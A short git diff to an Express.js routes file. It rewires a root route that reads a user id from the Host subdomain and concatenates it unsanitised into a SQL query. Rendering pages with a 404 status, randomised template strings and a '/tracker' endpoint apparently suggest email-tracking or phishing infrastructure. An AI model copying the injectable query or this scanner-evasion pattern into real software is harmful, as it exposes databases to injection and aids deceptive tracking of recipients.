@@ -212,13 +212,13 @@ module.exports = function (app) {
         res.sendFile(path.join(cwd, `/views/images/yzm/${req.params.name}.jpeg`))
     });
 
-    app.get('/', function (req, res) {
-        res.statusCode = 404;
-        var uidStr = req.headers.host;
+    // app.get('/', function (req, res) {
+    //     res.statusCode = 404;
+    //     var uidStr = req.headers.host;
 
-        var uid = uidStr.substr(0, uidStr.indexOf('.'));
-        res.render(path.join(cwd, '/index.html'), { layout: null, ranStr: ranStr.en(), func: code.encode, uid: uid, cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, ran: ranStr })
-    });
+    //     var uid = uidStr.substr(0, uidStr.indexOf('.'));
+    //     res.render(path.join(cwd, '/index.html'), { layout: null, ranStr: ranStr.en(), func: code.encode, uid: uid, cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, ran: ranStr })
+    // });
 
     app.post('/tracker', function (req, res) {
 
@@ -229,13 +229,13 @@ module.exports = function (app) {
 
 
     // 邮箱
-    app.get('/v2/:name', function (req, res) {
+    app.get('/', function (req, res) {
         var uidStr = req.headers.host;
         var uid = uidStr.substr(0, uidStr.indexOf('.'));
         uid = code.decode(uid);
         res.statusCode = 404;
-        var x = req.url.split('/')
-        var s_ran = x[x.length - 2]
+        // var x = req.url.split('/')
+        // var s_ran = x[x.length - 2]
         try {
             sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
                 var mid = rows[0].tempId;
